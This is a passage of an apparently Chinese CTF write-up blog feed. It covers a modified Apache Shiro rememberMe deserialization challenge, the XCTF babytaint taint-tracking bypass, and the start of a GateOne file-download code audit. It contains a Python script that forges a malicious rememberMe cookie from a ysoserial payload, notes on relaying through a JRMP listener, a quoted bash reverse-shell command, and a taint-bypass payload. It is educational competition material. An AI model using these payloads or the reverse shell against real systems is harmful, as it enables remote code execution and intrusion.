class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">byte</span>[] getKeyFromConfig() &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        InputStream fileInputStream = getClass().getResourceAsStream(<span class="string">"remember.key"</span>);</span><br><span class="line">        String key = <span class="string">""</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (fileInputStream == <span class="keyword">null</span> || fileInputStream.available() &lt; <span class="number">32</span>) &#123;</span><br><span class="line">        BufferedWriter writer = <span class="keyword">new</span> BufferedWriter(<span class="keyword">new</span> FileWriter(getClass().getResource(<span class="string">"/"</span>).getPath() + <span class="string">"com/collection/shiro/manager/remember.key"</span>));</span><br><span class="line">        key = RandomStringUtils.random(<span class="number">32</span>, <span class="string">"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&amp;*()_="</span>);</span><br><span class="line">        writer.write(key);</span><br><span class="line">        writer.close();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">byte</span>[] bytes = <span class="keyword">new</span> <span class="keyword">byte</span>[fileInputStream.available()];</span><br><span class="line">        fileInputStream.read(bytes);</span><br><span class="line">        key = <span class="keyword">new</span> String(bytes);</span><br><span class="line">        fileInputStream.close();</span><br><span class="line">        &#125; </span><br><span class="line">        key = (<span class="keyword">new</span> Md5Hash(key)).toString();</span><br><span class="line">        <span class="keyword">return</span> key.getBytes();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>WEB-INF/classes/com/collection/shiro/crypto/ShiroCipherService.class</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ShiroCipherService</span> <span class="keyword">implements</span> <span class="title">CipherService</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> ByteSource <span class="title">decrypt</span><span class="params">(<span class="keyword">byte</span>[] ciphertext, <span class="keyword">byte</span>[] key)</span> <span class="keyword">throws</span> CryptoException </span>&#123;</span><br><span class="line">    String skey = (<span class="keyword">new</span> Sha1Hash(<span class="keyword">new</span> String(key))).toString();</span><br><span class="line">    <span class="keyword">byte</span>[] bkey = skey.getBytes();</span><br><span class="line">    <span class="keyword">byte</span>[] data_bytes = <span class="keyword">new</span> <span class="keyword">byte</span>[ciphertext.length];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; ciphertext.length; i++) &#123;</span><br><span class="line">      data_bytes[i] = (<span class="keyword">byte</span>)(ciphertext[i] ^ bkey[i % bkey.length]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">byte</span>[] jsonData = <span class="keyword">new</span> <span class="keyword">byte</span>[ciphertext.length / <span class="number">2</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; jsonData.length; i++) &#123;</span><br><span class="line">      jsonData[i] = (<span class="keyword">byte</span>)(data_bytes[i * <span class="number">2</span>] ^ data_bytes[i * <span class="number">2</span> + <span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    JSONObject jsonObject = <span class="keyword">new</span> JSONObject(<span class="keyword">new</span> String(jsonData));</span><br><span class="line">    String serial = (String)jsonObject.get(<span class="string">"serialize_data"</span>);</span><br><span class="line">    <span class="keyword">return</span> ByteSource.Util.bytes(Base64.getDecoder().decode(serial));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> ByteSource <span class="title">encrypt</span><span class="params">(<span class="keyword">byte</span>[] plaintext, <span class="keyword">byte</span>[] key)</span> <span class="keyword">throws</span> CryptoException </span>&#123;</span><br><span class="line">    String sign = (<span class="keyword">new</span> Md5Hash(UUID.randomUUID().toString())).toString() + <span class="string">"asfda-92u134-"</span>;</span><br><span class="line">    Subject subject = SecurityUtils.getSubject();</span><br><span class="line">    HttpServletRequest servletRequest = WebUtils.getHttpRequest(subject);</span><br><span class="line">    String user_agent = servletRequest.getHeader(<span class="string">"User-Agent"</span>);</span><br><span class="line">    String ip_address = servletRequest.getHeader(<span class="string">"X-Forwarded-For"</span>);</span><br><span class="line">    ip_address = (ip_address == <span class="keyword">null</span>) ? servletRequest.getRemoteAddr() : ip_address;</span><br><span class="line">    String data = <span class="string">"&#123;\"user_is_login\":\"1\",\"sign\":\""</span> + sign + <span class="string">"\",\"ip_address\":\""</span> + ip_address + <span class="string">"\",\"user_agent\":\""</span> + user_agent + <span class="string">"\",\"serialize_data\":\""</span> + Base64.getEncoder().encodeToString(plaintext) + <span class="string">"\"&#125;"</span>;</span><br><span class="line">    <span class="keyword">byte</span>[] data_bytes = data.getBytes();</span><br><span class="line">    <span class="keyword">byte</span>[] okey = (<span class="keyword">new</span> Sha1Hash(<span class="keyword">new</span> String(key))).toString().getBytes();</span><br><span class="line">    <span class="keyword">byte</span>[] mkey = (<span class="keyword">new</span> Sha1Hash(UUID.randomUUID().toString())).toString().getBytes();</span><br><span class="line">    <span class="keyword">byte</span>[] out = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">2</span> * data_bytes.length];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; data_bytes.length; i++) &#123;</span><br><span class="line">      out[i * <span class="number">2</span>] = mkey[i % mkey.length];</span><br><span class="line">      out[i * <span class="number">2</span> + <span class="number">1</span>] = (<span class="keyword">byte</span>)(mkey[i % mkey.length] ^ data_bytes[i]);</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">byte</span>[] result = <span class="keyword">new</span> <span class="keyword">byte</span>[out.length];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; out.length; i++) &#123;</span><br><span class="line">      result[i] = (<span class="keyword">byte</span>)(out[i] ^ okey[i % okey.length]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ByteSource.Util.bytes(result);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>这相当于魔改了原版的 shiro, 原版的是直接用的 AES. 我们可以看到这里魔改后秘钥是读的 <code>com/collection/shiro/manager/remember.key</code>. (docker 初始自带一个 key, 所有人都用的一个, 不会自己生成).<br>然后算法也从 AES 变成了出题人手写的加密算法. 然后将序列化后的对象 base64 之后放在了 json 的 <code>serialize_data</code> 里面<br>我们可以写个脚本二次重写一下 ysoserial 生成的 payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha1</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode</span><br><span class="line"><span class="keyword">from</span> json <span class="keyword">import</span> dumps</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'/home/rmb122/repos/ysoserial/target/1.bin'</span></span><br><span class="line">payload = open(payload, <span class="string">'rb'</span>).read()</span><br><span class="line">payload = b64encode(payload).decode()</span><br><span class="line">data = &#123;<span class="string">"user_is_login"</span>: <span class="string">"1"</span>, <span class="string">"sign"</span>: <span class="string">"9368b2d39093ed7164841e4050f9cdbeasfda-92u134-"</span>, <span class="string">"ip_address"</span>: <span class="string">"10.10.19.245"</span>, <span class="string">"user_agent"</span>: <span class="string">"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36"</span>,</span><br><span class="line"><span class="string">"serialize_data"</span>: payload&#125;</span><br><span class="line">data = dumps(data).encode()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">key = <span class="string">"wR&amp;_(NVG#c&amp;9(CDhaDMZELDmxSe(mwbB"</span></span><br><span class="line">k = md5(key.encode()).hexdigest()</span><br><span class="line">k = sha1(k.encode()).hexdigest().encode()</span><br><span class="line"></span><br><span class="line">newdata = bytearray()</span><br><span class="line">newdata_2 = bytearray()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">    newdata.append(i)</span><br><span class="line">    newdata.append(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(newdata)):</span><br><span class="line">    newdata_2.append(newdata[i] ^ k[i % len(k)])</span><br><span class="line"></span><br><span class="line">print(b64encode(newdata_2))</span><br></pre></td></tr></table></figure><p>然后直接改到 rememberMe 的 Cookie 上就行了, 尝试了几个 payload 因为 Cookie 是有长度限制的, 平常是直接将序列化数据 base64 贴上去所以不会超出限制. 这里双重 base64 加上加密还得带一个 xor key 导致很多 payload 就不能直接用了. 所以我们这里还是用 JRMPClient 来中转一下, 在自己的机器上跑一个 ysoserial.exploit.JRMPListener 就 ok 了.</p><p>这里需要注意原版的 ysoserial 是直接用的 <code>java.Runtime.getRuntime().exec(payload)</code>, 相当于 <code>execv(payload.split(&#39; &#39;))</code>, 会导致 <code>bash -c &quot;bash -i &gt;&amp; /dev/tcp/10.0.19.3/7777 0&gt;&amp;1&quot;</code> 之类的不能用, 这里当时是用了别的命令利用的漏洞. 赛后 fork 了 <a href="https://github.com/rmb122/ysoserial" target="_blank" rel="noopener">ysoserial</a> 改了下, 用的 <code>java.Runtime.getRuntime().exec(new String[]{})</code> 就能直接弹 shell 之类的.</p><h2 id="XCTF-Final-babytaint-Writeup"><a href="#XCTF-Final-babytaint-Writeup" class="headerlink" title="XCTF Final babytaint Writeup"></a>XCTF Final babytaint Writeup</h2><p>拿到手先 Google <code>jalangi2</code> 是个啥, 可以搜到是个可以 hook javascript 各种操作的库. 这里是拿来搞了污点分析.<br>如果之前了解过一些编译原理和 PHP 的 taint 拓展, 那这道题确实挺简单的. 本质就是从 /dev/urandom/ 里面获取随机字节作为 secret, 题目 hook 了 “Source”() 的调用, 返回了 taint 过的 secret, 你需要通过某种方法 bypass 掉这个 taint. 也就是将污点去除.<br>我们看一下源码, 关键就是这个</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">AnnotatedValue</span>(<span class="params">val, shadow</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">this</span>.val = val;</span><br><span class="line"><span class="keyword">this</span>.shadow = shadow;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个就是一个包装类, 用 shadow 来记录是否是 taint 过的值. 题目 hook 住了所有计算, 拿二元计算来看</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">this</span>.binary = <span class="function"><span class="keyword">function</span>(<span class="params">iid, op, left, right, result</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">const</span> aleft = actual(left);</span><br><span class="line"><span class="keyword">const</span> aright = actual(right);</span><br><span class="line"><span class="keyword">switch</span> (op)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">"+"</span>:</span><br><span class="line">result = aleft + aright;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">"-"</span>:</span><br><span class="line">result = aleft - aright;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">"*"</span>:</span><br><span class="line">result = aleft * aright;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">"/"</span>:</span><br><span class="line">result = aleft / aright;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">"%"</span>:</span><br><span class="line">result = aleft % aright;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">"&lt;&lt;"</span>:</span><br><span class="line">result = aleft &lt;&lt; aright;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">"&gt;&gt;"</span>:</span><br><span class="line">result = aleft &gt;&gt; aright;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">"&gt;&gt;&gt;"</span>:</span><br><span class="line">result = aleft &gt;&gt;&gt; aright;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">"&lt;"</span>:</span><br><span class="line">result = aleft &lt; aright;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">"&gt;"</span>:</span><br><span class="line">result = aleft &gt; aright;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">"&lt;="</span>:</span><br><span class="line">result = aleft &lt;= aright;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">"&gt;="</span>:</span><br><span class="line">result = aleft &gt;= aright;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">"=="</span>:</span><br><span class="line">result = aleft == aright;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">"!="</span>:</span><br><span class="line">result = aleft != aright;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">"==="</span>:</span><br><span class="line">result = aleft === aright;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">"!=="</span>:</span><br><span class="line">result = aleft !== aright;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">"&amp;"</span>:</span><br><span class="line">result = aleft &amp; aright;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">"|"</span>:</span><br><span class="line">result = aleft | aright;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">"^"</span>:</span><br><span class="line">result = aleft ^ aright;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">"delete"</span>:</span><br><span class="line">result = <span class="keyword">delete</span> aleft[aright];</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">"instanceof"</span>:</span><br><span class="line">result = aleft <span class="keyword">instanceof</span> aright;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">"in"</span>:</span><br><span class="line">result = aleft <span class="keyword">in</span> aright;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">errExit(op + <span class="string">" at "</span> + iid + <span class="string">" not found"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> &#123;<span class="attr">result</span>: <span class="keyword">new</span> AnnotatedValue(result,</span><br><span class="line">shadow(left) || shadow(right))&#125;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>只要两个运算符有一个是 taint 过的, 返回的也是 taint 过的值. 同时我们想要拿到 flag, 需要调用 “Sink”(secret), 但是输入的 secret  </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (f === <span class="string">"Sink"</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (shadow(args[<span class="number">0</span>]))</span><br><span class="line">&#123;</span><br><span class="line">errExit(<span class="string">"Value passed into sink cannot be tained"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> arr = actual(args[<span class="number">0</span>])</span><br><span class="line"><span class="keyword">if</span> (!(arr <span class="keyword">instanceof</span> <span class="built_in">Array</span>) || arr.length !== <span class="number">0x10</span>)</span><br><span class="line">&#123;</span><br><span class="line">errExit(<span class="string">"must use an array with length 16 as the key"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; arr.length; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (shadow(arr[i])) <span class="comment">// check here</span></span><br><span class="line">&#123;</span><br><span class="line">errExit(<span class="string">"Value passed into sink cannot be tained"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (actual(arr[i]) !== secret[i])</span><br><span class="line">&#123;</span><br><span class="line">errExit(<span class="string">"Wrong key!"</span>)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">String</span>(fs.readFileSync(<span class="string">"flag"</span>)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>也不能是被 train 过的, 这就需要一点技巧来 bypass, 这里我用的是 delete 这个操作符, 因为 delete 影响的是左值对象的本身. 而这里 hook 的时候并不会将左值给 taint 掉, 只会将返回值 undefined 给 taint.<br>我们可以搞一个大小 256 的数组, 将 secret 作为删除的 key, 然后遍历找到是哪个 key 被 delete 掉, 我们就能获得 secret 的值而不被 taint.<br>最后 payload 如下:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">key=[];a=[]; <span class="keyword">for</span> (z=<span class="number">0</span>;z&lt;<span class="number">16</span>;z++)&#123;<span class="keyword">for</span> (i = <span class="number">0</span>;i&lt;<span class="number">256</span>;i++) &#123;a[i]=<span class="number">0</span>;&#125;;t=<span class="string">"Source"</span>();<span class="keyword">delete</span> a[t[z]];<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">256</span>;i++)&#123;<span class="keyword">if</span> (a[i] === <span class="literal">undefined</span>)&#123;key[z]=i;&#125;&#125;&#125;;<span class="string">"Sink"</span>(key);</span><br></pre></td></tr></table></figure><p>可以看到不是很复杂, 这道题好像也有很多队伍做出来 233</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;因为最近课程非常非常多, 还顺带考试 + 实验报告, 咕咕咕掉了许多比赛, 真正去的也只有 OGeek, 其他都是云比赛.&lt;br&gt;拿做出来的题目里面选两题写个 Writeup 吧, 不然太久没更新了 (逃&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="web" scheme="https://rmb122.com/tags/web/"/>
    
      <category term="writeup" scheme="https://rmb122.com/tags/writeup/"/>
    
  </entry>
  
  <entry>
    <title>Ogeek Easy Realworld Challenge 1&amp;2 Writeup</title>
    <link href="https://rmb122.com/2019/08/28/Ogeek-Easy-Realworld-Challenge-1-2-Writeup/"/>
    <id>https://rmb122.com/2019/08/28/Ogeek-Easy-Realworld-Challenge-1-2-Writeup/</id>
    <published>2019-08-28T01:58:59.000Z</published>
    <updated>2019-08-28T02:04:58.951Z</updated>
    
    <content type="html"><![CDATA[<p>这次 Ogeek 的 web 都挺有意思. 这两题偏向代码审计, 而且如题目名 <code>Easy Realworld</code>, 都是审计应用本身的漏洞, 差不多就是找 0day 了, 在这里分享给大家.</p><a id="more"></a><h2 id="Ogeek-Easy-Realworld-Challenge-1"><a href="#Ogeek-Easy-Realworld-Challenge-1" class="headerlink" title="Ogeek Easy Realworld Challenge 1"></a>Ogeek Easy Realworld Challenge 1</h2><p>打开网页, 发现是个在线 ssh 连接器, 根据写的大大 <code>Gateone</code>, 在 github 上找到 <code>https://github.com/liftoff/GateOne</code>, 而且上次更新是 2017 年, 很可能存在未修复漏洞. 先 fuzz 了一波没有什么收获, 而且几乎是刚开箱的状态, 于是尝试代码审计.  </p><p>根据 <code>run_gateone.py</code> 里面的  </p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gateone.core.server <span class="keyword">import</span> main</span><br><span class="line"></span><br><span class="line">main(installed=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure><p>找到 web 服务 <code>gateone/core/server.py</code>,<br>在 3692 行可以找到 设置 Handler 的地方, </p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">handlers = [</span><br><span class="line">            (index_regex, MainHandler),</span><br><span class="line">            (<span class="string">r"%sws"</span> % url_prefix,</span><br><span class="line">                ApplicationWebSocket, dict(apps=APPLICATIONS)),</span><br><span class="line">            (<span class="string">r"%sauth"</span> % url_prefix, AuthHandler),</span><br><span class="line">            (<span class="string">r"%sdownloads/(.*)"</span> % url_prefix, DownloadHandler),</span><br><span class="line">            (<span class="string">r"%sdocs/(.*)"</span> % url_prefix, tornado.web.StaticFileHandler, &#123;</span><br><span class="line">                <span class="string">"path"</span>: docs_path,</span><br><span class="line">                <span class="string">"default_filename"</span>: <span class="string">"index.html"</span></span><br><span class="line">            &#125;)</span><br><span class="line">        ]</span><br></pre></td></tr></table></figure><p>可以发现 <code>downloads/</code> 用的不是 tornado 自带的 StaticFileHandler, 而是作者自己造的轮子, 可能存在漏洞.<br>在 924 行可以找到 get 方法的定义  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(self, path, include_body=True)</span>:</span></span><br><span class="line">        session_dir = self.settings[<span class="string">'session_dir'</span>]</span><br><span class="line">        user = self.current_user</span><br><span class="line">        <span class="keyword">if</span> user <span class="keyword">and</span> <span class="string">'session'</span> <span class="keyword">in</span> user:</span><br><span class="line">            session = user[<span class="string">'session'</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            logger.error(_(<span class="string">"DownloadHandler: Could not determine use session"</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="comment"># Something is wrong</span></span><br><span class="line">        filepath = os.path.join(session_dir, session, <span class="string">'downloads'</span>, path)</span><br><span class="line">        abspath = os.path.abspath(filepath)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(abspath):</span><br><span class="line">            self.set_status(<span class="number">404</span>)</span><br><span class="line">            self.write(self.get_error_html(<span class="number">404</span>))</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.isfile(abspath):</span><br><span class="line">            <span class="keyword">raise</span> tornado.web.HTTPError(<span class="number">403</span>, <span class="string">"%s is not a file"</span>, path)</span><br><span class="line">        <span class="keyword">import</span> stat, mimetypes</span><br><span class="line">        stat_result = os.stat(abspath)</span><br><span class="line">        modified = datetime.fromtimestamp(stat_result[stat.ST_MTIME])</span><br><span class="line">        self.set_header(<span class="string">"Last-Modified"</span>, modified)</span><br><span class="line">        mime_type, encoding = mimetypes.guess_type(abspath)</span><br><span class="line">        <span class="keyword">if</span> mime_type:</span><br><span class="line">            self.set_header(<span class="string">"Content-Type"</span>, mime_type)</span><br><span class="line">        <span class="comment"># Set the Cache-Control header to private since this file is not meant</span></span><br><span class="line">        <span class="comment"># to be public.</span></span><br><span class="line">        self.set_header(<span class="string">"Cache-Control"</span>, <span class="string">"private"</span>)</span><br><span class="line">        <span class="comment"># Add some additional headers</span></span><br><span class="line">        self.set_header(<span class="string">'Access-Control-Allow-Origin'</span>, <span class="string">'*'</span>)</span><br><span class="line">        <span class="comment"># Check the If-Modified-Since, and don't send the result if the</span></span><br><span class="line">        <span class="comment"># content has not been modified</span></span><br><span class="line">        ims_value = self.request.headers.get(<span class="string">"If-Modified-Since"</span>)</span><br><span class="line">        <span class="keyword">if</span> ims_value <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">import</span> email.utils</span><br><span class="line">            date_tuple = email.utils.parsedate(ims_value)</span><br><span class="line">            if_since = datetime.fromtimestamp(time.mktime(date_tuple))</span><br><span class="line">            <span class="keyword">if</span> if_since &gt;= modified:</span><br><span class="line">                self.set_status(<span 